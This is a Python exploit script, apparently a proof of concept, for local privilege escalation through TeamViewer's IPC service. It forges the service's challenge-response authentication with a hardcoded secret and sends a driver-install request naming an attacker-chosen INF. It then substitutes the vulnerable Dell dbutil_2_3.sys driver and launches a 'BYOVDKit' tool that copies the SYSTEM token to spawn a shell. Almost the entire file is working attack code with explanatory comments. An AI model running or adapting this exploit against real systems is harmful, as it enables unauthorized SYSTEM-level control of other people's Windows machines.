import shutil
import socket
import struct
import os
import time
import subprocess
import random
import sys
import hashlib
from six.moves import range
from win32api import GetFileVersionInfo, LOWORD, HIWORD

if sys.version_info[0] == 3:
    prompt = input
else:
    prompt = raw_input

IPC_PACKET_DATA_AUTH = 45
IPC_PACKET_DATA_INSTALL_VPN_DRIVER = 51
IPC_PACKET_DATA_CONTROL = 1
ELEMENT_CHALLENGE_REQUEST = 9
ELEMENT_CHALLENGE_RESPONSE = 10
ELEMENT_TAIL = 254
ELEMENT_PID_REQUEST = 1
ELEMENT_VERSION_REQUEST = 4
ELEMENT_DRIVER_PATH_REQUEST = 3
ELEMENT_LANG_REQUEST = 6
ELEMENT_VERSION_MAJOR_REQUEST = 9
ELEMENT_VERSION_MINOR_REQUEST = 10
ELEMENT_VERSION_BUILD_REQUEST = 11


class IPC_PACKET_DATA_ELEMENT:
    def __init__(self, data=None, element_type=None, element_data=None):
        if data is not None:
            try:
                self.element_type, packet_datalen = struct.unpack('<BL', data[:5])
                if packet_datalen > 0:
                    self.element_data = data[5:5+packet_datalen]
            except Exception as e:
                raise ValueError('invalid data: {}'.format(e))
        else:
            self.element_type = element_type
            self.element_data = element_data

    def __len__(self):
        return len(self.toBytes())

    def toBytes(self):
        packet = struct.pack('<B', self.element_type)
        packet_datalen = len(self.element_data)
        packet += struct.pack('<L', packet_datalen)
        if packet_datalen > 0:
            packet += self.element_data
        return packet

    def __str__(self):
        s = 'Data Element Type: {}\n'.format(self.element_type)
        s += '\t\tData Element Len: {}\n'.format(len(self.element_data))
        s += '\t\tData Element Data: {} ({})\n'.format(self.element_data.encode('hex'), repr(self.element_data))
        return s


class IPC_PACKET_DATA:
    def __init__(self, data=None, packet_type=None, packet_elements=None):
        if data is not None:
            try:
                self.packet_type, num_elements = struct.unpack('<BB', data[:2])
                if num_elements > 0:
                    index = 2
                    self.packet_elements = []
                    for _ in range(num_elements):
                        item = IPC_PACKET_DATA_ELEMENT(data=data[index:])
                        self.packet_elements.append(item)
                        index += len(item)
                else:
                    self.packet_elements = []
            except Exception as e:
                raise ValueError('invalid data: {}'.format(e))

        else:
            if packet_type is None:
                self.packet_type = 1
            else:
                self.packet_type = packet_type
            if packet_elements is None:
                self.packet_elements = []
            else:
                self.packet_elements = packet_elements

    def __len__(self):
        return len(self.toBytes())

    def addElement(self, element_type, element_data):
        self.packet_elements.append(IPC_PACKET_DATA_ELEMENT(element_type=element_type, element_data=element_data))

    def toBytes(self):
        packet = struct.pack('<B', self.packet_type)
        num_elements = len(self.packet_elements)
        if num_elements == 0:
            packet += '\x00'
        else:
            packet += struct.pack('<B', num_elements)
            for i in range(num_elements):
                packet += self.packet_elements[i].toBytes()
        return packet

    def __str__(self):
        s = 'Data Paquet Type: {}\n'.format(self.packet_type)
        s += '\tElements: {}\n'.format(len(self.packet_elements))
        for i in range(len(self.packet_elements)):
            s += '\tElement {}:\n\t\t{}'.format(i, str(self.packet_elements[i]))
        return s


class IPC_PACKET:
    def __init__(self, data=None):
        self.packet_data = []
        if data is not None:
            try:
                self.signature, self.npackets, datalen = struct.unpack('<HHL', data[:8])
                if datalen > 0:
                    _rawdata = data[8:8+datalen]
                    index = 0
                    while index < len(_rawdata):
                        item = IPC_PACKET_DATA(data=_rawdata[index:])
                        self.packet_data.append(item)
                        index += len(item)
            except Exception as e:
                raise ValueError('invalid data: {}'.format(e))

        else:
            self.signature = 8
            self.npackets = 1

    def __len__(self):
        return len(self.toBytes())

    def toBytes(self):
        packet = struct.pack('<H', self.signature)
        packet += struct.pack('<H', self.npackets)
        data = b''
        for i in range(len(self.packet_data)):
            data += self.packet_data[i].toBytes()
        datalen = len(data)
        packet += struct.pack('<L', datalen)
        if datalen > 0:
            packet += data
        return packet

    def __str__(self):
        s = 'Signature: {}\n'.format(self.signature)
        s += 'Number of packets?: {}\n'.format(self.npackets)
        for i in range(len(self.packet_data)):
            s += 'IPC Packet Element {}:\n\t{}'.format(i, str(self.packet_data[i]))
        return s

    @staticmethod
    def readIPCPacket(sk):
        try:
            data = sk.recv(4)  # read signature and npackets
            datalen = sk.recv(4)
            data += datalen  # read packet len
            nlen = struct.unpack('<L', datalen)[0]
            if nlen > 0:
                data += sk.recv(nlen)  # read packet data
            return IPC_PACKET(data=data)
        except Exception:
            return None


def getClientAuth(is_request=True, challenge=None):
    ipcClientAuthData = IPC_PACKET_DATA()
    ipcClientAuthData.packet_type = IPC_PACKET_DATA_AUTH  # Auth type
    if challenge is None:
        # Create random challenge
        challenge = b'\xB7\x48\x77\x26\x8A\x72\xB8\xF0\xFE\x57\x04\x03\xFC\x64\x2E\xB0'
    # Add challenge
    ipcClientAuthData.packet_elements.append(
        IPC_PACKET_DATA_ELEMENT(element_type=ELEMENT_CHALLENGE_REQUEST if is_request else ELEMENT_CHALLENGE_RESPONSE,
                                element_data=challenge))
    # Add tail
    ipcClientAuthData.packet_elements.append(IPC_PACKET_DATA_ELEMENT(element_type=ELEMENT_TAIL, element_data=b'\x01'))
    ipcClientAuth = IPC_PACKET()
    ipcClientAuth.packet_data.append(ipcClientAuthData)
    return ipcClientAuth


def getServerChallengeFromResponse(packet):
    data_packet = packet.packet_data[0]
    for element in data_packet.packet_elements:
        if element.element_type == ELEMENT_CHALLENGE_REQUEST:
            return element.element_data


def getControlRequest(pid, version_str):
    packet_data = IPC_PACKET_DATA()
    packet_data.packet_type = IPC_PACKET_DATA_CONTROL
    # Add PID
    packet_data.addElement(ELEMENT_PID_REQUEST, struct.pack('<L', pid))
    # Add unknown type 2
    packet_data.addElement(2, b'\x02\x00\x00\x00')
    # Add unknown type 3
    packet_data.addElement(3, b'\x00')
    # Add version utf-16-le
    # version must be in major.minor.build format
    packet_data.addElement(ELEMENT_VERSION_REQUEST, '{}\x00'.format(version_str).encode('utf-16-le'))
    # Add unknown type 5
    packet_data.addElement(5, b'\x01\x00\x00\x00')
    # Add lang
    packet_data.addElement(ELEMENT_LANG_REQUEST, 'en\x00'.encode('utf-16-le'))
    # Add unknown type 7
    packet_data.addElement(7, b'\x00')
    # Add version major, minor and build
    major, minor, build = version_str.split('.')
    packet_data.addElement(ELEMENT_VERSION_MAJOR_REQUEST, '{}\x00'.format(major).encode('utf-16-le'))
    packet_data.addElement(ELEMENT_VERSION_MINOR_REQUEST, '{}\x00'.format(minor).encode('utf-16-le'))
    packet_data.addElement(ELEMENT_VERSION_BUILD_REQUEST, '{}\x00'.format(build).encode('utf-16-le'))
    # Add unknown type 13
    packet_data.addElement(13, b'\x01')
    # Add unknown type 14
    packet_data.addElement(14, b'\xdd\x7b\xa7\x37')
    # Add unknown type 15
    packet_data.addElement(15, b'\x1d\xbf\x52\x39')
    # Add unknown type 17
    packet_data.addElement(17, b'\x01\x00\x00\x00')
    # Add unknown type 243
    packet_data.addElement(243, b'\x02\x00\x00\x00')
    # Add unknown type 253
    packet_data.addElement(253, b'\xfd\xcf\xff\x02')
    # Add unknown type 254
    packet_data.addElement(254, b'\x01')
    # Add unknown type 255
    packet_data.addElement(255, b'\x8c\x83\x14\x3b')
    control_packet = IPC_PACKET()
    control_packet.packet_data.append(packet_data)
    return control_packet


def getInstallDriverRequest(inf_path):
    packet_data = IPC_PACKET_DATA()
    packet_data.packet_type = IPC_PACKET_DATA_INSTALL_VPN_DRIVER
    # Add unknown type 1
    packet_data.addElement(1, b'\x01')
    # Add unknown type 2
    packet_data.addElement(2, b'\x02\x00\x00\x00')
    # Add inf path
    packet_data.addElement(ELEMENT_DRIVER_PATH_REQUEST,
                           '--inf {} --id TEAMVIEWERVPN\x00'.format(inf_path).encode('utf-16-le'))
    # Add unknown type 5
    packet_data.addElement(5, b'\x00\x00')
    # Add unknown type 6
    packet_data.addElement(6, b'\x00\x00')
    # Add unknown type 7
    packet_data.addElement(7, b'\x00')
    # Add unknown type 8
    packet_data.addElement(8, 'Local\\DriverInstallFinishEvent_VPN\x00'.encode('utf-16-le'))
    # Add unknown type 9
    packet_data.addElement(9, b'\x00\x00\x00\x00')
    # Add unknown type 243
    packet_data.addElement(243, b'\x02\x00\x00\x00')
    # Add unknown type 253
    packet_data.addElement(253, b'\x01\x00\x00\x00')
    # Add unknown type 254
    packet_data.addElement(254, b'\x01')
    # Add unknown type 255
    packet_data.addElement(255, b'\x95\xd4\x041')
    packet = IPC_PACKET()
    packet.packet_data.append(packet_data)
    return packet


def randomAscii(count=0):
    rndstr = []
    for i in range(0, count):
        c = chr(random.randint(0x41, 0x7A))
        while not c.isalpha():
            c = chr(random.randint(0x41, 0x7A))
        rndstr.append(c)
    return ''.join(rndstr)


def dump(paq, msg):
    print(msg)
    # UNcomment the following to view packet data
    # print('=' * 50)
    # print(paq)
    # print('=' * 50)
    # print(repr(paq.toBytes()))
    # print('=' * 50)


def getVersionNumber(filename):
    info = GetFileVersionInfo(filename, '\\')
    ms = info['FileVersionMS']
    ls = info['FileVersionLS']
    return HIWORD(ms), LOWORD(ms), HIWORD(ls)


def main():
    target = '127.0.0.1'
    port = 5939
    sock_timeout = 120
    sock = socket.create_connection((target, port), timeout=sock_timeout)

    # Launch BYOVDKit.exe with dbutil_2_3.sys driver and cmd with copied token from process 4
    print('Excuting BYOVDKit to test if driver is not already installed...')
    subprocess.call(["BYOVDKit.exe", '1', 'token', '4'], shell=False)

    # First of all the client send a challenge to server IPC, i.e, TeamViewer_service.exe
    # The IPC server calculates the response hashing (MD5) the 16 bytes send by the client concatenated with
    # 43 6E 67 62 F2 5E A8 D7 04 E5 22 BF A5 5D A1 6A
    # TeamViewer client can use it to verify that is connecting to a real TeamViewer_service IPC. Actually, we do not
    # care about that, we always send the same challenge and do not check the response
    ipcClientAuth1 = getClientAuth()
    dump(ipcClientAuth1, '1st Send...')
    sock.sendall(ipcClientAuth1.toBytes())
    response_challenge = getServerChallengeFromResponse(IPC_PACKET.readIPCPacket(sock))
    print('Challenge from response: {}'.format(repr(response_challenge)))

    # Now the server sends its challenge, that we need to calculate the valid response and the response to our first
    # challenge. We do not check if its response is valid.
    # In order to calculate the valid response, we need to hash (MD5) the challenge sent by the server concatenated
    # with 40 C2 89 05 3B E8 C1 69 7D 74 D8 36 FC 1D 2F 6E
    secret = b'\x40\xc2\x89\x05\x3b\xe8\xc1\x69\x7d\x74\xd8\x36\xfc\x1d\x2f\x6e'
    md5_value = hashlib.md5(response_challenge + secret).digest()
    ipcClientAuth2 = getClientAuth(is_request=False, challenge=md5_value)
    dump(ipcClientAuth2, '2nd Send...')
    sock.sendall(ipcClientAuth2.toBytes())

    # After the authentication completes succesfully the servers expects a "Control Message" that basically contains
    # the PID of the client process connecting to the IPC and the TeamViewer version.
    pid = os.getpid()
    progFilesPath = str(os.environ['ProgramW6432'])
    TVOrgPath = os.path.join(progFilesPath, 'TeamViewer')
    # Get version from TeamViewer.exe file
    version = '.'.join(str(x) for x in getVersionNumber(os.path.join(TVOrgPath, 'TeamViewer.exe')))
    ipcControl = getControlRequest(pid, version)
    dump(ipcControl, '3rd Send...')
    sock.sendall(ipcControl.toBytes())

    # Now the server sends multiple commands for sync configuration. We read it all, but no necessary to do anything
    # with that information.
    print('Waiting for sync configuration commands...')
    counter = 0
    paq = ''
    while paq is not None:
        try:
            paq = IPC_PACKET.readIPCPacket(sock)
            counter += 1
            if paq is not None:
                dump(paq, 'Read command packet {}'.format(counter))
        except Exception:
            break
    print('Wait finished. {} commands were sent.'.format(counter))

    # Now the magic message, which request the service to install the VPN Driver. The INF file is arbitrary send by the
    # client, so we can specify an arbitary path (INF file)
    # that eventually TeamViewer_service and its helper program will finish calling
    # UpdateDriverForPlugAndPlayDevicesA(...) with our arbitary INF.
    # I have not found a way to install an arbitary service using the INF becauase UpdateDriverForPlugAndPlayDevicesA
    # updates the driver for an existant Hardware and cannot install a service.
    # Using an INF that creates a service will make UpdateDriverForPlugAndPlayDevicesA fail with error code 259, so we
    # need to install an arbitary driver.
    # Also it is possible to use the original INF and cat file and rename an arbitary driver "teamviewervpv.sys" and it
    # will be loaded on to the system.
    infName = '{}.inf'.format(randomAscii(6))
    driverOrgPath = os.path.join(progFilesPath, TVOrgPath, 'x64')
    scriptDestPath = os.path.dirname(os.path.abspath(__file__))
    shutil.copy(os.path.join(driverOrgPath, 'TeamViewerVPN.cat'), os.path.join(scriptDestPath, 'TeamViewerVPN.cat'))
    shutil.copy(os.path.join(driverOrgPath, 'TeamViewerVPN.inf'), os.path.join(scriptDestPath, infName))
    shutil.copy(os.path.join(scriptDestPath, 'dbutil_2_3.sys'), os.path.join(scriptDestPath, 'TeamViewerVPN.sys'))
    ipcDriverInstall = getInstallDriverRequest(os.path.join(scriptDestPath, infName))
    dump(ipcDriverInstall, 'Sending driver install...')
    sock.sendall(ipcDriverInstall.toBytes())
    sock.close()
    # Wait until user accept the driver installation
    prompt('Press ENTER key when driver install window is closed...')

    # Delete copied files
    os.remove(os.path.join(scriptDestPath, 'TeamViewerVPN.cat'))
    os.remove(os.path.join(scriptDestPath, infName))
    os.remove(os.path.join(scriptDestPath, 'TeamViewerVPN.sys'))

    # Launch BYOVDKit.exe with dbutil_2_3.sys driver and cmd with copied token from process 4
    print('Excuting BYOVDKit...')
    subprocess.call(["BYOVDKit.exe", '1', 'token', '4'], shell=False)


if __name__ == '__main__':
    main()
